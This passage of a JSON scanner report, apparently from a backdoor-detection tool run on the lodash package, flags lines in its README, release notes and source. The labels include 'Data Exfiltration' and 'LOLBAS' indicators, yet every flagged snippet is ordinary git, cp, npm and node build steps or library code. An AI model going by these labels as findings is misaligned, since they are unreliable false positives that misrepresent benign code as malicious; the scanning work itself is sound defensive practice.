                      "text": " *\n * var object = { 'a': [{ 'b': { 'c': 3 } }] };\n *\n * _.get(object, 'a[0].b.c');\n * // => 3\n *\n * _.get(object, ['a', '0', 'b', 'c']);\n",
                      "markdown": "` *\n * var object = { 'a': [{ 'b': { 'c': 3 } }] };\n *\n * _.get(object, 'a[0].b.c');\n * // => 3\n *\n * _.get(object, ['a', '0', 'b', 'c']);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/lodash.zip/package/README.md"
                },
                "region": {
                  "startLine": 27,
                  "startColumn": 3,
                  "endLine": 27,
                  "endColumn": 7,
                  "snippet": {
                    "text": "var object = require('lodash/fp/object');\n\n// Cherry-pick methods for smaller browserify/rollup/webpack bundles.\nvar at = require('lodash/at');\nvar curryN = require('lodash/fp/curryN');\n```\n\n",
                    "rendered": {
                      "text": "var object = require('lodash/fp/object');\n\n// Cherry-pick methods for smaller browserify/rollup/webpack bundles.\nvar at = require('lodash/at');\nvar curryN = require('lodash/fp/curryN');\n```\n\n",
                      "markdown": "`var object = require('lodash/fp/object');\n\n// Cherry-pick methods for smaller browserify/rollup/webpack bundles.\nvar at = require('lodash/at');\nvar curryN = require('lodash/fp/curryN');\n```\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/lodash.zip/package/_equalByTag.js"
                },
                "region": {
                  "startLine": 92,
                  "startColumn": 25,
                  "endLine": 92,
                  "endColumn": 30,
                  "snippet": {
                    "text": "        return false;\n      }\n      // Assume cyclic values are equal.\n      var stacked = stack.get(object);\n      if (stacked) {\n        return stacked == other;\n      }\n",
                    "rendered": {
                      "text": "        return false;\n      }\n      // Assume cyclic values are equal.\n      var stacked = stack.get(object);\n      if (stacked) {\n        return stacked == other;\n      }\n",
                      "markdown": "`        return false;\n      }\n      // Assume cyclic values are equal.\n      var stacked = stack.get(object);\n      if (stacked) {\n        return stacked == other;\n      }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/lodash.zip/package/release.md"
                },
                "region": {
                  "startLine": 32,
                  "startColumn": 28,
                  "endLine": 32,
                  "endColumn": 36,
                  "snippet": {
                    "text": "$ git clone https://github.com/bnjmnt4n/lodash-cli.git\n```\n2. Update lodash-cli to accomdate changes in lodash source. This can typically involve adding new function dependency mappings in lib/mappings.js. Sometimes, additional changes might be needed for more involved functions.\n3. In the lodash repository, update references to the lodash version in README.md, lodash.js, package.jsona nd package-lock.json\n4. Run:\n```sh\nnpm run build\n",
                    "rendered": {
                      "text": "$ git clone https://github.com/bnjmnt4n/lodash-cli.git\n```\n2. Update lodash-cli to accomdate changes in lodash source. This can typically involve adding new function dependency mappings in lib/mappings.js. Sometimes, additional changes might be needed for more involved functions.\n3. In the lodash repository, update references to the lodash version in README.md, lodash.js, package.jsona nd package-lock.json\n4. Run:\n```sh\nnpm run build\n",
                      "markdown": "`$ git clone https://github.com/bnjmnt4n/lodash-cli.git\n```\n2. Update lodash-cli to accomdate changes in lodash source. This can typically involve adding new function dependency mappings in lib/mappings.js. Sometimes, additional changes might be needed for more involved functions.\n3. In the lodash repository, update references to the lodash version in README.md, lodash.js, package.jsona nd package-lock.json\n4. Run:\n```sh\nnpm run build\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/lodash.zip/package/release.md"
                },
                "region": {
                  "startLine": 31,
                  "startColumn": 2,
                  "endLine": 31,
                  "endColumn": 10,
                  "snippet": {
                    "text": "$ git clone https://github.com/lodash/lodash.git\n$ git clone https://github.com/bnjmnt4n/lodash-cli.git\n```\n2. Update lodash-cli to accomdate changes in lodash source. This can typically involve adding new function dependency mappings in lib/mappings.js. Sometimes, additional changes might be needed for more involved functions.\n3. In the lodash repository, update references to the lodash version in README.md, lodash.js, package.jsona nd package-lock.json\n4. Run:\n```sh\n",
                    "rendered": {
                      "text": "$ git clone https://github.com/lodash/lodash.git\n$ git clone https://github.com/bnjmnt4n/lodash-cli.git\n```\n2. Update lodash-cli to accomdate changes in lodash source. This can typically involve adding new function dependency mappings in lib/mappings.js. Sometimes, additional changes might be needed for more involved functions.\n3. In the lodash repository, update references to the lodash version in README.md, lodash.js, package.jsona nd package-lock.json\n4. Run:\n```sh\n",
                      "markdown": "`$ git clone https://github.com/lodash/lodash.git\n$ git clone https://github.com/bnjmnt4n/lodash-cli.git\n```\n2. Update lodash-cli to accomdate changes in lodash source. This can typically involve adding new function dependency mappings in lib/mappings.js. Sometimes, additional changes might be needed for more involved functions.\n3. In the lodash repository, update references to the lodash version in README.md, lodash.js, package.jsona nd package-lock.json\n4. Run:\n```sh\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/lodash.zip/package/release.md"
                },
                "region": {
                  "startLine": 18,
                  "startColumn": 2,
                  "endLine": 18,
                  "endColumn": 10,
                  "snippet": {
                    "text": "npm run build\nnpm run doc\n\n2. update mappings in ldoash-cli\n3. copy ldoash into lodash-cli node modules and package json.\n\nnode ./node_modules/lodash-cli/bin/lodash core exports=node -o ./npm-package/core.js\n",
                    "rendered": {
                      "text": "npm run build\nnpm run doc\n\n2. update mappings in ldoash-cli\n3. copy ldoash into lodash-cli node modules and package json.\n\nnode ./node_modules/lodash-cli/bin/lodash core exports=node -o ./npm-package/core.js\n",
                      "markdown": "`npm run build\nnpm run doc\n\n2. update mappings in ldoash-cli\n3. copy ldoash into lodash-cli node modules and package json.\n\nnode ./node_modules/lodash-cli/bin/lodash core exports=node -o ./npm-package/core.js\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/lodash.zip/package/release.md"
                },
                "region": {
                  "startLine": 48,
                  "startColumn": 1,
                  "endLine": 48,
                  "endColumn": 7,
                  "snippet": {
                    "text": "cp ../lodash-temp/lodash.js lodash.js\ncp ../lodash-temp/lodash.min.js lodash.min.js\n\n❯ node ../lodash-cli/bin/lodash modularize exports=es -o .\n",
                    "rendered": {
                      "text": "cp ../lodash-temp/lodash.js lodash.js\ncp ../lodash-temp/lodash.min.js lodash.min.js\n\n❯ node ../lodash-cli/bin/lodash modularize exports=es -o .\n",
                      "markdown": "`cp ../lodash-temp/lodash.js lodash.js\ncp ../lodash-temp/lodash.min.js lodash.min.js\n\n❯ node ../lodash-cli/bin/lodash modularize exports=es -o .\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/lodash.zip/package/release.md"
                },
                "region": {
                  "startLine": 45,
                  "startColumn": 37,
                  "endLine": 46,
                  "endColumn": 3,
                  "snippet": {
                    "text": "node ../lodash-cli/bin/lodash modularize exports=node -o .\ncp ../lodash-temp/lodash.core.js core.js\ncp ../lodash-temp/lodash.core.min.js core.min.js\ncp ../lodash-temp/lodash.js lodash.js\ncp ../lodash-temp/lodash.min.js lodash.min.js\n\n❯ node ../lodash-cli/bin/lodash modularize exports=es -o .\n",
                    "rendered": {
                      "text": "node ../lodash-cli/bin/lodash modularize exports=node -o .\ncp ../lodash-temp/lodash.core.js core.js\ncp ../lodash-temp/lodash.core.min.js core.min.js\ncp ../lodash-temp/lodash.js lodash.js\ncp ../lodash-temp/lodash.min.js lodash.min.js\n\n❯ node ../lodash-cli/bin/lodash modularize exports=es -o .\n",
                      "markdown": "`node ../lodash-cli/bin/lodash modularize exports=node -o .\ncp ../lodash-temp/lodash.core.js core.js\ncp ../lodash-temp/lodash.core.min.js core.min.js\ncp ../lodash-temp/lodash.js lodash.js\ncp ../lodash-temp/lodash.min.js lodash.min.js\n\n❯ node ../lodash-cli/bin/lodash modularize exports=es -o .\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/lodash.zip/package/release.md"
                },
                "region": {
                  "startLine": 44,
                  "startColumn": 48,
                  "endLine": 45,
                  "endColumn": 3,
                  "snippet": {
                    "text": "cp lodash.js dist/lodash.min.js dist/lodash.core.js dist/lodash.core.min.js ../lodash-temp/\nnode ../lodash-cli/bin/lodash modularize exports=node -o .\ncp ../lodash-temp/lodash.core.js core.js\ncp ../lodash-temp/lodash.core.min.js core.min.js\ncp ../lodash-temp/lodash.js lodash.js\ncp ../lodash-temp/lodash.min.js lodash.min.js\n\n❯ node ../lodash-cli/bin/lodash modularize exports=es -o .\n",
                    "rendered": {
                      "text": "cp lodash.js dist/lodash.min.js dist/lodash.core.js dist/lodash.core.min.js ../lodash-temp/\nnode ../lodash-cli/bin/lodash modularize exports=node -o .\ncp ../lodash-temp/lodash.core.js core.js\ncp ../lodash-temp/lodash.core.min.js core.min.js\ncp ../lodash-temp/lodash.js lodash.js\ncp ../lodash-temp/lodash.min.js lodash.min.js\n\n❯ node ../lodash-cli/bin/lodash modularize exports=es -o .\n",
                      "markdown": "`cp lodash.js dist/lodash.min.js dist/lodash.core.js dist/lodash.core.min.js ../lodash-temp/\nnode ../lodash-cli/bin/lodash modularize exports=node -o .\ncp ../lodash-temp/lodash.core.js core.js\ncp ../lodash-temp/lodash.core.min.js core.min.js\ncp ../lodash-temp/lodash.js lodash.js\ncp ../lodash-temp/lodash.min.js lodash.min.js\n\n❯ node ../lodash-cli/bin/lodash modularize exports=es -o .\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/lodash.zip/package/release.md"
                },
                "region": {
                  "startLine": 43,
                  "startColumn": 40,
                  "endLine": 44,
                  "endColumn": 3,
                  "snippet": {
                    "text": "mkdir ../lodash-temp\ncp lodash.js dist/lodash.min.js dist/lodash.core.js dist/lodash.core.min.js ../lodash-temp/\nnode ../lodash-cli/bin/lodash modularize exports=node -o .\ncp ../lodash-temp/lodash.core.js core.js\ncp ../lodash-temp/lodash.core.min.js core.min.js\ncp ../lodash-temp/lodash.js lodash.js\ncp ../lodash-temp/lodash.min.js lodash.min.js\n\n",
                    "rendered": {
                      "text": "mkdir ../lodash-temp\ncp lodash.js dist/lodash.min.js dist/lodash.core.js dist/lodash.core.min.js ../lodash-temp/\nnode ../lodash-cli/bin/lodash modularize exports=node -o .\ncp ../lodash-temp/lodash.core.js core.js\ncp ../lodash-temp/lodash.core.min.js core.min.js\ncp ../lodash-temp/lodash.js lodash.js\ncp ../lodash-temp/lodash.min.js lodash.min.js\n\n",
                      "markdown": "`mkdir ../lodash-temp\ncp lodash.js dist/lodash.min.js dist/lodash.core.js dist/lodash.core.min.js ../lodash-temp/\nnode ../lodash-cli/bin/lodash modularize exports=node -o .\ncp ../lodash-temp/lodash.core.js core.js\ncp ../lodash-temp/lodash.core.min.js core.min.js\ncp ../lodash-temp/lodash.js lodash.js\ncp ../lodash-temp/lodash.min.js lodash.min.js\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/lodash.zip/package/release.md"
                },
                "region": {
                  "startLine": 42,
                  "startColumn": 58,
                  "endLine": 43,
                  "endColumn": 3,
                  "snippet": {
                    "text": "5. Add a commit and tag the release\nmkdir ../lodash-temp\ncp lodash.js dist/lodash.min.js dist/lodash.core.js dist/lodash.core.min.js ../lodash-temp/\nnode ../lodash-cli/bin/lodash modularize exports=node -o .\ncp ../lodash-temp/lodash.core.js core.js\ncp ../lodash-temp/lodash.core.min.js core.min.js\ncp ../lodash-temp/lodash.js lodash.js\ncp ../lodash-temp/lodash.min.js lodash.min.js\n",
                    "rendered": {
                      "text": "5. Add a commit and tag the release\nmkdir ../lodash-temp\ncp lodash.js dist/lodash.min.js dist/lodash.core.js dist/lodash.core.min.js ../lodash-temp/\nnode ../lodash-cli/bin/lodash modularize exports=node -o .\ncp ../lodash-temp/lodash.core.js core.js\ncp ../lodash-temp/lodash.core.min.js core.min.js\ncp ../lodash-temp/lodash.js lodash.js\ncp ../lodash-temp/lodash.min.js lodash.min.js\n",
                      "markdown": "`5. Add a commit and tag the release\nmkdir ../lodash-temp\ncp lodash.js dist/lodash.min.js dist/lodash.core.js dist/lodash.core.min.js ../lodash-temp/\nnode ../lodash-cli/bin/lodash modularize exports=node -o .\ncp ../lodash-temp/lodash.core.js core.js\ncp ../lodash-temp/lodash.core.min.js core.min.js\ncp ../lodash-temp/lodash.js lodash.js\ncp ../lodash-temp/lodash.min.js lodash.min.js\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/lodash.zip/package/release.md"
                },
                "region": {
                  "startLine": 41,
                  "startColumn": 91,
                  "endLine": 42,
                  "endColumn": 5,
                  "snippet": {
                    "text": "```\n5. Add a commit and tag the release\nmkdir ../lodash-temp\ncp lodash.js dist/lodash.min.js dist/lodash.core.js dist/lodash.core.min.js ../lodash-temp/\nnode ../lodash-cli/bin/lodash modularize exports=node -o .\ncp ../lodash-temp/lodash.core.js core.js\ncp ../lodash-temp/lodash.core.min.js core.min.js\ncp ../lodash-temp/lodash.js lodash.js\n",
                    "rendered": {
                      "text": "```\n5. Add a commit and tag the release\nmkdir ../lodash-temp\ncp lodash.js dist/lodash.min.js dist/lodash.core.js dist/lodash.core.min.js ../lodash-temp/\nnode ../lodash-cli/bin/lodash modularize exports=node -o .\ncp ../lodash-temp/lodash.core.js core.js\ncp ../lodash-temp/lodash.core.min.js core.min.js\ncp ../lodash-temp/lodash.js lodash.js\n",
                      "markdown": "````\n5. Add a commit and tag the release\nmkdir ../lodash-temp\ncp lodash.js dist/lodash.min.js dist/lodash.core.js dist/lodash.core.min.js ../lodash-temp/\nnode ../lodash-cli/bin/lodash modularize exports=node -o .\ncp ../lodash-temp/lodash.core.js core.js\ncp ../lodash-temp/lodash.core.min.js core.min.js\ncp ../lodash-temp/lodash.js lodash.js\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/lodash.zip/package/release.md"
                },
                "region": {
                  "startLine": 40,
                  "startColumn": 20,
                  "endLine": 41,
                  "endColumn": 3,
                  "snippet": {
                    "text": "node ../lodash-cli/bin/lodash core -o ./dist/lodash.core.js\n```\n5. Add a commit and tag the release\nmkdir ../lodash-temp\ncp lodash.js dist/lodash.min.js dist/lodash.core.js dist/lodash.core.min.js ../lodash-temp/\nnode ../lodash-cli/bin/lodash modularize exports=node -o .\ncp ../lodash-temp/lodash.core.js core.js\ncp ../lodash-temp/lodash.core.min.js core.min.js\n",
                    "rendered": {
                      "text": "node ../lodash-cli/bin/lodash core -o ./dist/lodash.core.js\n```\n5. Add a commit and tag the release\nmkdir ../lodash-temp\ncp lodash.js dist/lodash.min.js dist/lodash.core.js dist/lodash.core.min.js ../lodash-temp/\nnode ../lodash-cli/bin/lodash modularize exports=node -o .\ncp ../lodash-temp/lodash.core.js core.js\ncp ../lodash-temp/lodash.core.min.js core.min.js\n",
                      "markdown": "`node ../lodash-cli/bin/lodash core -o ./dist/lodash.core.js\n```\n5. Add a commit and tag the release\nmkdir ../lodash-temp\ncp lodash.js dist/lodash.min.js dist/lodash.core.js dist/lodash.core.min.js ../lodash-temp/\nnode ../lodash-cli/bin/lodash modularize exports=node -o .\ncp ../lodash-temp/lodash.core.js core.js\ncp ../lodash-temp/lodash.core.min.js core.min.js\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/lodash.zip/package/release.md"
                },
                "region": {
                  "startLine": 36,
                  "startColumn": 11,
                  "endLine": 37,
                  "endColumn": 5,
                  "snippet": {
                    "text": "4. Run:\n```sh\nnpm run build\nnpm run doc\nnode ../lodash-cli/bin/lodash core -o ./dist/lodash.core.js\n```\n5. Add a commit and tag the release\nmkdir ../lodash-temp\n",
                    "rendered": {
                      "text": "4. Run:\n```sh\nnpm run build\nnpm run doc\nnode ../lodash-cli/bin/lodash core -o ./dist/lodash.core.js\n```\n5. Add a commit and tag the release\nmkdir ../lodash-temp\n",
                      "markdown": "`4. Run:\n```sh\nnpm run build\nnpm run doc\nnode ../lodash-cli/bin/lodash core -o ./dist/lodash.core.js\n```\n5. Add a commit and tag the release\nmkdir ../lodash-temp\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/lodash.zip/package/release.md"
                },
                "region": {
                  "startLine": 29,
                  "startColumn": 1,
                  "endLine": 29,
                  "endColumn": 6,
                  "snippet": {
                    "text": "1. Clone the two repositories:\n```sh\n$ git clone https://github.com/lodash/lodash.git\n$ git clone https://github.com/bnjmnt4n/lodash-cli.git\n```\n2. Update lodash-cli to accomdate changes in lodash source. This can typically involve adding new function dependency mappings in lib/mappings.js. Sometimes, additional changes might be needed for more involved functions.\n3. In the lodash repository, update references to the lodash version in README.md, lodash.js, package.jsona nd package-lock.json\n",
                    "rendered": {
                      "text": "1. Clone the two repositories:\n```sh\n$ git clone https://github.com/lodash/lodash.git\n$ git clone https://github.com/bnjmnt4n/lodash-cli.git\n```\n2. Update lodash-cli to accomdate changes in lodash source. This can typically involve adding new function dependency mappings in lib/mappings.js. Sometimes, additional changes might be needed for more involved functions.\n3. In the lodash repository, update references to the lodash version in README.md, lodash.js, package.jsona nd package-lock.json\n",
                      "markdown": "`1. Clone the two repositories:\n```sh\n$ git clone https://github.com/lodash/lodash.git\n$ git clone https://github.com/bnjmnt4n/lodash-cli.git\n```\n2. Update lodash-cli to accomdate changes in lodash source. This can typically involve adding new function dependency mappings in lib/mappings.js. Sometimes, additional changes might be needed for more involved functions.\n3. In the lodash repository, update references to the lodash version in README.md, lodash.js, package.jsona nd package-lock.json\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/lodash.zip/package/release.md"
                },
                "region": {
                  "startLine": 28,
                  "startColumn": 1,
                  "endLine": 28,
                  "endColumn": 6,
                  "snippet": {
                    "text": "\n1. Clone the two repositories:\n```sh\n$ git clone https://github.com/lodash/lodash.git\n$ git clone https://github.com/bnjmnt4n/lodash-cli.git\n```\n2. Update lodash-cli to accomdate changes in lodash source. This can typically involve adding new function dependency mappings in lib/mappings.js. Sometimes, additional changes might be needed for more involved functions.\n",
                    "rendered": {
                      "text": "\n1. Clone the two repositories:\n```sh\n$ git clone https://github.com/lodash/lodash.git\n$ git clone https://github.com/bnjmnt4n/lodash-cli.git\n```\n2. Update lodash-cli to accomdate changes in lodash source. This can typically involve adding new function dependency mappings in lib/mappings.js. Sometimes, additional changes might be needed for more involved functions.\n",
                      "markdown": "`\n1. Clone the two repositories:\n```sh\n$ git clone https://github.com/lodash/lodash.git\n$ git clone https://github.com/bnjmnt4n/lodash-cli.git\n```\n2. Update lodash-cli to accomdate changes in lodash source. This can typically involve adding new function dependency mappings in lib/mappings.js. Sometimes, additional changes might be needed for more involved functions.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/lodash.zip/package/release.md"
                },
                "region": {
                  "startLine": 21,
                  "startColumn": 84,
                  "endLine": 22,
                  "endColumn": 5,
                  "snippet": {
                    "text": "2. update mappings in ldoash-cli\n3. copy ldoash into lodash-cli node modules and package json.\n\nnode ./node_modules/lodash-cli/bin/lodash core exports=node -o ./npm-package/core.js\nnode ./node_modules/lodash-cli/bin/lodash modularize exports=node -o ./npm-package\n\n\n\n",
                    "rendered": {
                      "text": "2. update mappings in ldoash-cli\n3. copy ldoash into lodash-cli node modules and package json.\n\nnode ./node_modules/lodash-cli/bin/lodash core exports=node -o ./npm-package/core.js\nnode ./node_modules/lodash-cli/bin/lodash modularize exports=node -o ./npm-package\n\n\n\n",
                      "markdown": "`2. update mappings in ldoash-cli\n3. copy ldoash into lodash-cli node modules and package json.\n\nnode ./node_modules/lodash-cli/bin/lodash core exports=node -o ./npm-package/core.js\nnode ./node_modules/lodash-cli/bin/lodash modularize exports=node -o ./npm-package\n\n\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/lodash.zip/package/release.md"
                },
                "region": {
                  "startLine": 20,
                  "endLine": 21,
                  "endColumn": 5,
                  "snippet": {
                    "text": "\n2. update mappings in ldoash-cli\n3. copy ldoash into lodash-cli node modules and package json.\n\nnode ./node_modules/lodash-cli/bin/lodash core exports=node -o ./npm-package/core.js\nnode ./node_modules/lodash-cli/bin/lodash modularize exports=node -o ./npm-package\n\n\n",
                    "rendered": {
                      "text": "\n2. update mappings in ldoash-cli\n3. copy ldoash into lodash-cli node modules and package json.\n\nnode ./node_modules/lodash-cli/bin/lodash core exports=node -o ./npm-package/core.js\nnode ./node_modules/lodash-cli/bin/lodash modularize exports=node -o ./npm-package\n\n\n",
                      "markdown": "`\n2. update mappings in ldoash-cli\n3. copy ldoash into lodash-cli node modules and package json.\n\nnode ./node_modules/lodash-cli/bin/lodash core exports=node -o ./npm-package/core.js\nnode ./node_modules/lodash-cli/bin/lodash modularize exports=node -o ./npm-package\n\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/lodash.zip/package/release.md"
                },
                "region": {
                  "startLine": 19,
                  "startColumn": 30,
                  "endLine": 19,
                  "endColumn": 36,
                  "snippet": {
                    "text": "npm run doc\n\n2. update mappings in ldoash-cli\n3. copy ldoash into lodash-cli node modules and package json.\n\nnode ./node_modules/lodash-cli/bin/lodash core exports=node -o ./npm-package/core.js\nnode ./node_modules/lodash-cli/bin/lodash modularize exports=node -o ./npm-package\n",
                    "rendered": {
                      "text": "npm run doc\n\n2. update mappings in ldoash-cli\n3. copy ldoash into lodash-cli node modules and package json.\n\nnode ./node_modules/lodash-cli/bin/lodash core exports=node -o ./npm-package/core.js\nnode ./node_modules/lodash-cli/bin/lodash modularize exports=node -o ./npm-package\n",
                      "markdown": "`npm run doc\n\n2. update mappings in ldoash-cli\n3. copy ldoash into lodash-cli node modules and package json.\n\nnode ./node_modules/lodash-cli/bin/lodash core exports=node -o ./npm-package/core.js\nnode ./node_modules/lodash-cli/bin/lodash modularize exports=node -o ./npm-package\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/lodash.zip/package/release.md"
                },
                "region": {
                  "startLine": 10,
                  "startColumn": 47,
                  "endLine": 11,
                  "endColumn": 3,
                  "snippet": {
                    "text": "node ./node_modules/lodash-cli/bin/lodash core exports=node -o ./npm-package/core.js\nnode ./node_modules/lodash-cli/bin/lodash modularize exports=node -o ./npm-package\ncp lodash.js npm-package/lodash.js\ncp dist/lodash.min.js npm-package/lodash.min.js\ncp LICENSE npm-package/LICENSE\n\n1. Clone two repos\nBump lodash version in package.json, readme, package=locak, lodash.js\n",
                    "rendered": {
                      "text": "node ./node_modules/lodash-cli/bin/lodash core exports=node -o ./npm-package/core.js\nnode ./node_modules/lodash-cli/bin/lodash modularize exports=node -o ./npm-package\ncp lodash.js npm-package/lodash.js\ncp dist/lodash.min.js npm-package/lodash.min.js\ncp LICENSE npm-package/LICENSE\n\n1. Clone two repos\nBump lodash version in package.json, readme, package=locak, lodash.js\n",
                      "markdown": "`node ./node_modules/lodash-cli/bin/lodash core exports=node -o ./npm-package/core.js\nnode ./node_modules/lodash-cli/bin/lodash modularize exports=node -o ./npm-package\ncp lodash.js npm-package/lodash.js\ncp dist/lodash.min.js npm-package/lodash.min.js\ncp LICENSE npm-package/LICENSE\n\n1. Clone two repos\nBump lodash version in package.json, readme, package=locak, lodash.js\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
